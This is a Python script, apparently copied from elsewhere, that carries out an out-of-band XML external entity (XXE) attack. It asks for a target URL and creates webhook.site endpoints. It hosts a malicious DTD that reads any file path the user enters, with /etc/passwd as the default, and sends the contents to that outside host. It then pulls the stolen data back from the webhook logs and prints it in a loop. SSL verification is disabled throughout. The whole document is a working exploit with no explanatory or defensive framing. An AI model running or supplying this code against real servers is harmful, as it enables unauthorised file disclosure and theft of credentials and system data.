#!/usr/bin/python3
#not mine
import ssl, requests, json, urllib.parse

# Disable SSL warnings and create unverified HTTPS context
requests.packages.urllib3.disable_warnings()
ssl._create_default_https_context = ssl._create_unverified_context if hasattr(ssl, '_create_unverified_context') else ssl.create_default_context()

# Prompt user for the vulnerable URL
target_url = input("Enter the vulnerable URL (e.g., https://example.com/login): ")

# Webhook setup
webhook_endpoint = "https://webhook.site/token"
webhook_response = json.loads(requests.post(webhook_endpoint, data={'timeout': '0'}).text)
webhook_id = webhook_response['uuid']

def prepare_dtd(file_path, dtd_id):
    # Create the malicious DTD file
    dtd_content = f'<!ENTITY % file SYSTEM "file://{file_path}">\r\n<!ENTITY % send "<!ENTITY exfil SYSTEM \'http://webhook.site/{webhook_id}/XXE?%file;\'>">%send;'
    requests.put(f"{webhook_endpoint}/{dtd_id}", data={"timeout": "0", "default_content": dtd_content})

# Initialize DTD with a default file path
initial_dtd = f'<!ENTITY % file SYSTEM "file:///etc/passwd">\r\n<!ENTITY % send "<!ENTITY exfil SYSTEM \'http://webhook.site/{webhook_id}/XXE?%file;\'>">%send;'
dtd_id = json.loads(requests.post(webhook_endpoint, data={"timeout": "0", "default_content": initial_dtd}).text)['uuid']

while True:
    # Get the file path to exfiltrate from the user
    file_to_read = input('Enter the file path to read: ')
    prepare_dtd(file_to_read, dtd_id)
    
    # Build and send the payload to the target
    malicious_payload = f'''<?xml version="1.0"?><!DOCTYPE exploit SYSTEM "http://webhook.site/{dtd_id}"><exploit>&exfil;</exploit>'''
    requests.post(url=target_url, data=malicious_payload, headers={'Content-Type': 'text/xml'})
    print("[+] Payload sent to target.")

    # Retrieve the exfiltrated data
    exfil_data = json.loads(requests.get(f"{webhook_endpoint}/{webhook_id}/requests").text)['data'][0]['url'].split('?')[1]
    print(f">> Exfiltrated Content:\n{urllib.parse.unquote(exfil_data)}")
    
    # Clear the webhook logs
    requests.delete(f"{webhook_endpoint}/{webhook_id}/request")
